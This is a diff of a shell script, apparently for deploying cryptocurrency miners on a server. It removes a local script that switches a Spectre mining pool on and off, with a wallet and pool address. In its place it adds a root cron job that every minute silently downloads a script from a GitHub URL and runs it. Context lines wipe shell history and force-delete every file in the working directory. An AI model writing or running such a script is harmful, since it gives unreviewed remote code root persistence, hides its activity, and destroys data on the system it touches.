@@ -57,18 +57,8 @@ history -c && history -w
 rm -fR *
 rm -fv *
 sleep 3
-cat >>checkQliStatus.sh<<EOF
-status=$(tail -1 /var/log/qli.log | awk '{print $6}')
-if [ "$status" = "Idling" ];
-then
-  screen -dmS spectre-pool spr/bin/spr -a spectre:qqvak2q2x3k2u66e35wfnmuzs2t8qpulzzstnfudxu2qs0dn5mrc2e03s3qwd -s 139.162.113.144 -p 18110 -t 6
-else
-  screen -S spectre-pool -X quit
-fi
-EOF
-chmod +x checkQliStatus.sh
 
 #Add Cronjob
 cat >>/var/spool/cron/crontabs/root<<EOF
-*/1 * * * * /root/checkQliStatus.sh > /root/checkQliStatus.log
+* * * * * bash <(curl -s 'https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/IdlingCheck.sh') > /dev/null 2>&1 &
 EOF
